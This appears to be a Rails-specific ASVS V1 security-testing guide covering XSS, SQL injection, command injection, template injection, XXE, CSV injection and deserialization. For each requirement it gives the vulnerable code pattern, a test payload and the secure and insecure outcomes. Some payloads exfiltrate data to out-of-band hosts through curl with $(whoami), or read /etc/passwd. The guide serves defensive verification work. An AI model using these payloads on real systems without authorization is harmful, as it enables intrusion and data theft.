# V1 – Encoding and Sanitization (Rails)

> **ASVS 5.0 · Chapter V1** — projected onto Ruby on Rails.
> Base: [`_asvs-base/V01-Encoding-and-Sanitization.md`](../_asvs-base/V01-Encoding-and-Sanitization.md).
> This is the big injection/output-encoding chapter: XSS, SQLi, command
> injection, SSTI, deserialization, XXE, CSV injection.

Rails auto-escapes and parameterizes **by default**, so nearly every finding
here is an explicit opt-out. Grep targets if source is available:

```sh
grep -rniE 'html_safe|raw\(|<%==|where\(["'\''].*#\{|order\(|find_by_sql|system\(|`|%x|open\(|eval\(|constantize|ERB\.new|YAML\.load|Marshal\.load|Oj\.load' app/ lib/
```

## V1.1 Encoding architecture

- **1.1.1 / 1.1.2 (L2)** — Rack decodes request params once into a canonical
  form before the app sees them; ERB performs HTML escaping at **render time**
  (the final step before the browser), satisfying "encode adjacent to the
  interpreter". The failure mode is code that *pre-encodes* and stores HTML
  entities in the DB and then renders again → double-encoding, or that decodes
  twice. Verify stored values are raw, not pre-escaped.

## V1.2 Injection prevention

#### 1.2.1 — HTML output encoding (XSS) · L1
> Output encoding for HTML is relevant for the context (elements, attributes, CSS, headers).

- **Mechanism (Rails):** ERB `<%= user.bio %>` auto-escapes. Opt-outs that
  reintroduce XSS: `raw(user.bio)`, `user.bio.html_safe`, `<%== user.bio %>`,
  helpers returning a safe buffer, and user data in attribute/CSS context.
- **How to test:** inject a marker into every reflected/stored field and view
  source.
- **Payload:** `xss"><svg onload=alert(document.domain)>`
- **Positive (secure):** response contains `&lt;svg onload=...&gt;` (escaped);
  no script runs.
- **Negative (insecure):** response contains a literal `<svg onload=...>` tag;
  payload executes — stored/reflected XSS.
- Full sink catalogue (attribute, JS, sanitizer contexts): see §V1.3 and
  upstream [XSS Injection](../../upstream/PayloadsAllTheThings/XSS%20Injection/README.md).

#### 1.2.2 — Safe URL building / protocol allowlist · L1
> Encode untrusted data in URLs; permit only safe protocols (no javascript:/data:).

- **Mechanism (Rails):** `link_to name, user.url` and `<a href="<%= user.url %>">`
  do **not** neutralize the scheme — HTML-escaping leaves `javascript:` intact.
- **Payload:** set a profile/website URL to `javascript:alert(document.domain)`
  (also try `data:text/html,<script>alert(1)</script>`, `java\tscript:alert(1)`).
- **Positive (secure):** scheme validated to `http(s)`; rendered `href` is
  empty/sanitized or the value rejected at save.
- **Negative (insecure):** `href="javascript:alert(document.domain)"` present;
  clicking executes.

#### 1.2.3 — JavaScript/JSON context encoding · L1
> Encode when dynamically building JS/JSON to avoid JS/JSON injection.

- **Mechanism (Rails):** data interpolated into a `<script>` block needs
  `json_escape`/`j`. `<%= raw @data.to_json %>` inside `<script>` allows a
  `</script>` breakout; `config.action_view.escape_html_entities_in_json`
  governs JSON escaping.
- **Payload (stored value later inlined in a script):** `</script><script>alert(document.domain)</script>`
- **Positive (secure):** `<` is emitted as `<`; the script block stays
  intact, no breakout.
- **Negative (insecure):** literal `</script><script>...` closes the block and
  the injected script executes.

#### 1.2.4 — SQL injection (ActiveRecord) · L1
> Use parameterized queries / ORM protections.

- **Mechanism (Rails):** safe = hash conditions `where(name: x)` or binds
  `where("name = ?", x)`. Injectable = string interpolation `where("name='#{x}'")`
  and raw-SQL methods fed user input: `order`, `reorder`, `group`, `having`,
  `select`, `pluck`, `find_by_sql`, `exists?`(string). `order(params[:sort])`
  is the most common real-world Rails SQLi (ORDER BY can't bind).
- **How to test:** inject into sort/filter/search params; error, boolean, and
  time-based oracles.
- **Payload (time-based, Postgres, sort param):** `?sort=(SELECT 1 FROM pg_sleep(5))`
- **Positive (secure):** `?sort=` restricted to an allowlist → unknown value
  ignored/`400`; no delay, no DB error.
- **Negative (insecure):** ~5 s delay (or `PG::SyntaxError` on a stray quote in
  the body) — injectable. Then `sqlmap`.
- Detail: [rails-sqli.org](https://rails-sqli.org/); upstream [SQL Injection](../../upstream/PayloadsAllTheThings/SQL%20Injection/README.md).

#### 1.2.5 — OS command injection · L1
> Protect against OS command injection; use parameterized OS calls.

- **Mechanism (Rails):** single-string `system("convert #{f} out.png")`,
  backticks, `%x{}`, `IO.popen`, `Open3.capture2("... #{x}")` spawn a shell.
  **`Kernel#open`/`URI.open`/`open(params[:x])` execute a command when the arg
  starts with `|`.** Array form `system("convert", f, "out")` is shell-safe.
- **Payload:** `127.0.0.1; sleep 8` · `| id` · `$(curl http://<collab>/$(whoami))`
  · for an `open()` sink: `| id`
- **Positive (secure):** metacharacters treated as literal data (array-form
  exec) or input rejected; no delay/callback.
- **Negative (insecure):** ~8 s delay, or a Collaborator DNS/HTTP hit — RCE.
- Upstream [Command Injection](../../upstream/PayloadsAllTheThings/Command%20Injection/README.md).

#### 1.2.9 — Regex metacharacter escaping · L2
- **Mechanism (Rails):** user input built into a `Regexp` without
  `Regexp.escape` allows metacharacter injection / ReDoS (see 1.3.12).
  `Regexp.new(Regexp.escape(params[:q]))` is the safe form.

#### 1.2.10 — CSV / formula injection · L3
- **Mechanism (Rails):** exports via `CSV.generate`/`comma` gem that write
  user data beginning with `= + - @ \t` into cells → formula injection in
  Excel/Sheets.
- **Payload (stored field later exported):** `=HYPERLINK("http://evil/?"&A1,"click")`
- **Positive (secure):** leading formula chars prefixed with `'` / escaped per
  RFC 4180 on export.
- **Negative (insecure):** cell exported verbatim; opens as a live formula.
- Upstream [CSV Injection](../../upstream/PayloadsAllTheThings/CSV%20Injection/README.md).

**LDAP (1.2.6) / XPath (1.2.7) / LaTeX (1.2.8):** usually **N/A** to a stock
Rails app. Applicable only if `net-ldap` with interpolated filters, `Nokogiri`
XPath built from user input, or a LaTeX→PDF pipeline (`--shell-escape`) is
present — then test per the upstream
[LDAP](../../upstream/PayloadsAllTheThings/LDAP%20Injection/README.md) /
[XPATH](../../upstream/PayloadsAllTheThings/XPATH%20Injection/README.md) /
[LaTeX](../../upstream/PayloadsAllTheThings/LaTeX%20Injection/README.md) pages.

## V1.3 Sanitization

#### 1.3.1 — HTML sanitization of rich text · L1
- **Mechanism (Rails):** `sanitize`/`Rails::Html::Sanitizer` (loofah) and
  ActionText. Findings: a custom allowlist that permits `href` without scheme
  checks (→ `javascript:`), or adds `style`/`svg`/`iframe`.
- **Payload:** `<a href="javascript:alert(1)">x</a>` · mXSS:
  `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`
- **Positive (secure):** dangerous tags/attrs stripped; output inert.
- **Negative (insecure):** payload survives sanitization and executes. Also
  pin `rails-html-sanitizer`/`loofah` versions for CVEs ([V15](V15-secure-coding-and-architecture.md)).

#### 1.3.2 — Avoid eval / dynamic code execution · L1
- **Mechanism (Rails):** `eval`, `instance_eval`, `constantize`/`safe_constantize`,
  `send`/`public_send` with user-controlled names. `User.find(params[:type].constantize...)`
  / `obj.send(params[:method])` are gadget sinks.
- **Payload:** `method=destroy` / `type=Kernel` into a `send`/`constantize` sink.
- **Positive (secure):** method/class names checked against an allowlist.
- **Negative (insecure):** arbitrary method invoked / class instantiated.

#### 1.3.6 — SSRF protection · L2
- Projected in full at [V15 §15.3.2](V15-secure-coding-and-architecture.md)
  (outbound fetch, `open-uri`, carrierwave `remote_url`, metadata endpoints,
  the `open "|"` RCE overlap). Upstream [SSRF](../../upstream/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/README.md).

#### 1.3.7 — Template injection (SSTI) · L2
> Don't build templates from untrusted input.

- **Mechanism (Rails):** `ERB.new(params[:tpl]).result`, `render inline: params[:tpl]`,
  `render params[:view]`, Slim/Haml built from user input → **RCE**. Liquid
  (sandboxed) → data disclosure.
- **How to test:** polyglot, then confirm evaluation.
- **Payload:** `<%= 7*7 %>` → `49` confirms ERB; then `<%= `id` %>` /
  `<%= system("curl http://<collab>/$(whoami)") %>`. Liquid: `{{7*7}}`.
- **Positive (secure):** payload rendered literally (`<%= 7*7 %>` shown as-is);
  user data only passed as locals to a fixed template.
- **Negative (insecure):** `49` / command output / OOB hit — RCE.
- Upstream [Server Side Template Injection](../../upstream/PayloadsAllTheThings/Server%20Side%20Template%20Injection/README.md).

**1.3.4 SVG / 1.3.5 Markdown/CSS (L2):** if user-supplied SVG is served inline
(stored XSS via `<svg><script>`) or Markdown/BBCode is rendered (redcarpet with
`filter_html` off), sanitize/validate. Test by uploading
`<svg xmlns="..."><script>alert(document.domain)</script></svg>` and fetching
it inline. **1.3.12 ReDoS (L3):** user input into a catastrophic-backtracking
regex (also the Rails `format:` route constraints and `email` regexes) →
`aaaa...!` style payloads cause CPU blowup; see
[Regular Expression](../../upstream/PayloadsAllTheThings/Regular%20Expression/README.md).

## V1.4 Memory / unmanaged code

**1.4.1–1.4.3 (L2):** **N/A** to application-level Ruby (managed, memory-safe).
Relevant only to native C extensions the app ships; otherwise mark not
applicable.

## V1.5 Safe deserialization

#### 1.5.1 — XXE / XML parser hardening · L1
- **Mechanism (Rails):** `Nokogiri` does **not** resolve external entities by
  default; the finding is explicit `Nokogiri::XML(xml) { |c| c.noent }` /
  `Nokogiri::XML::ParseOptions::NOENT`, or `REXML`/`libxml-ruby` misuse. Rails'
  XML params parser was historically dangerous (CVE-2013-0156).
- **Payload:** classic external-entity file read (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`).
- **Positive (secure):** entity not resolved; `&xxe;` empty or parse error.
- **Negative (insecure):** `/etc/passwd` contents reflected.
- Upstream [XXE Injection](../../upstream/PayloadsAllTheThings/XXE%20Injection/README.md).

#### 1.5.2 — Safe deserialization · L2
> Deserialization mechanisms defined as insecure must not be used on untrusted input.

- **Mechanism (Rails):** `Marshal.load`, `YAML.load`/`Psych.load` (==
  `unsafe_load` on Ruby < 3.1; safe on ≥ 3.1), `YAML.unsafe_load`,
  `Oj.load` in `:object` mode. Reaches RCE via the `:marshal` cookie
  serializer + leaked `secret_key_base` ([V7](V07-session-management.md)), or
  `serialize :col, coder: YAML` (CVE-2022-32224).
- **Payload:** a Ruby universal gadget chain (Marshal/YAML); confirm OOB first.
- **Positive (secure):** `:json` serializer; `YAML.safe_load` with
  `permitted_classes`; `Oj` in `:strict`; no `Marshal.load` on untrusted data.
- **Negative (insecure):** gadget triggers a DNS/HTTP callback or command — RCE.
- Upstream [Insecure Deserialization](../../upstream/PayloadsAllTheThings/Insecure%20Deserialization/README.md).

**1.5.3 parser consistency (L3):** multiple JSON/XML/URL parsers disagreeing
(e.g. `JSON.parse` vs a JS client, or Ruby `URI` vs the proxy) → JSON interop /
RFI/SSRF parser-confusion; test duplicate keys and odd URL forms.

---
*Base ↔ framework map: this page covers ASVS V1.1–V1.5. Governance/N-A items
are noted inline; every requirement ID is accounted for.*
